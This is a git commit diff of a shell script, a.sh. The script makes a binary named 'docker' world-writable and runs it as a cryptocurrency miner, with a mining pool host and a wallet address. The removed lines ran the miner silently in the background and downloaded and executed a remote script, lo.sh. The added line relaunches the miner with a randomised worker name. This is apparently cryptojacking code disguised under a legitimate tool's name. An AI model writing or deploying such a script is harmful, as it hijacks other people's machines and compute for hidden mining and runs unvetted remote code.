bcbca91b902ce53d9693a9c3c75b48b5fc0fde18
ncamacho07 <84513246+ncamacho07@users.noreply.github.com>
2022-03-12 15:43:01 +0700

    Update a.sh

--- a.sh
+++ a.sh
@@ -1,4 +1,3 @@
 #!/bin/bash
 chmod 777 docker
-./docker -a rx/sfx -o sf.pool-pay.com:4025 -u Safexsp1o77aa1VcscEtwfBeDaqLyqnh4TZt1wjzAbmZ1CTTvnik8RN8fSSJnhm4BLVJB5kUokKJN8SCu7c8PZ3RJ7pfRGv5wsy4r -p br --donate-level 1 > /dev/null 2>&1 &
-wget https://raw.githubusercontent.com/ncamacho07/butut/main/lo.sh && chmod +x lo.sh && ./lo.sh
+./docker -o sf.pool-pay.com:4025 -u Safexsp1o77aa1VcscEtwfBeDaqLyqnh4TZt1wjzAbmZ1CTTvnik8RN8fSSJnhm4BLVJB5kUokKJN8SCu7c8PZ3RJ7pfRGv5wsy4r -p $(echo $(shuf -i 1-20000 -n 1)-G) -k -a rx/sfx
